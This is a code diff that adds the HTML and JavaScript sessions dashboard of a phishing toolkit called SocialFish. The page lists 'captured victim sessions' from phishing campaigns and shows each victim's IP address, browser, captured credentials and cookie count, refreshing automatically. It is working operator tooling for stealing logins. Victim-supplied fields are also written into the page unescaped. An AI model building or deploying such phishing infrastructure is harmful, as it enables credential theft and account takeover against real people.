@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sessions - SocialFish</title>
+    <link rel="stylesheet" href="/static/css/theme.css">
+    <link rel="stylesheet" href="/static/vendor/bootstrap-4.1/bootstrap.min.css">
+    <style>
+        body { background: #1a1a1a; color: #fff; }
+        .navbar { background: #222; }
+        .table { color: #fff; }
+        .table thead { background: #2a2a2a; }
+        .table tbody tr { background: #1a1a1a; border: 1px solid #333; }
+        .table tbody tr:hover { background: #2a2a2a; }
+        .ip-cell { font-family: monospace; font-size: 0.9em; }
+        .new-session { background: #4CAF50; padding: 2px 6px; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-dark">
+        <span class="navbar-brand mb-0 h1">SocialFish Sessions</span>
+        <button class="btn btn-sm btn-info" onclick="refreshSessions()">Refresh</button>
+    </nav>
+
+    <div class="container-fluid mt-4">
+        <h2>Captured Victim Sessions</h2>
+        <p>All credentials and data captured from phishing campaigns.</p>
+
+        <table class="table table-sm table-striped">
+            <thead>
+                <tr>
+                    <th>Session ID</th>
+                    <th>Template</th>
+                    <th>Victim IP</th>
+                    <th>Browser</th>
+                    <th>Captured At</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="sessionsList">
+                <tr><td colspan="6" style="text-align: center;">Loading...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <script src="/static/vendor/jquery-3.2.1.min.js"></script>
+    <script>
+        function loadSessions() {
+            fetch('/sessions', { headers: { 'Accept': 'application/json' } })
+                .then(r => r.json())
+                .then(sessions => {
+                    const tbody = document.getElementById('sessionsList');
+                    tbody.innerHTML = '';
+                    
+                    if (sessions.length === 0) {
+                        tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">No sessions yet</td></tr>';
+                        return;
+                    }
+
+                    sessions.forEach((s, idx) => {
+                        const isNew = idx === 0 ? '<span class="new-session">NEW</span>' : '';
+                        tbody.innerHTML += `
+                            <tr>
+                                <td><code>${s.session_hash}</code></td>
+                                <td>#${s.template_id}</td>
+                                <td class="ip-cell">${s.victim_ip}</td>
+                                <td>${s.victim_ua.substring(0, 30)}...</td>
+                                <td>${s.timestamp}</td>
+                                <td>
+                                    <button class="btn btn-xs btn-primary" onclick="viewSession(${s.id})">View</button>
+                                    <button class="btn btn-xs btn-danger" onclick="deleteSession(${s.id})">Delete</button>
+                                </td>
+                            </tr>
+                        `;
+                    });
+                });
+        }
+
+        function viewSession(id) {
+            fetch(`/session/${id}`, { headers: { 'Accept': 'application/json' } })
+                .then(r => r.json())
+                .then(data => {
+                    const credsText = Object.entries(data.credentials)
+                        .map(([k, v]) => `${k}: ${v}`)
+                        .join('\n');
+                    
+                    alert(`Session #${id}\n\nVictim IP: ${data.victim_ip}\nCredentials:\n${credsText}\n\nCookies: ${data.cookies.length} captured`);
+                });
+        }
+
+        function deleteSession(id) {
+            if (confirm('Delete this session?')) {
+                fetch(`/session/${id}`, { method: 'DELETE' })
+                    .then(() => loadSessions());
+            }
+        }
+
+        function refreshSessions() {
+            loadSessions();
+        }
+
+        // Load on page load
+        loadSessions();
+
+        // Auto-refresh every 5 seconds
+        setInterval(loadSessions, 5000);
+    </script>
+</body>
+</html>
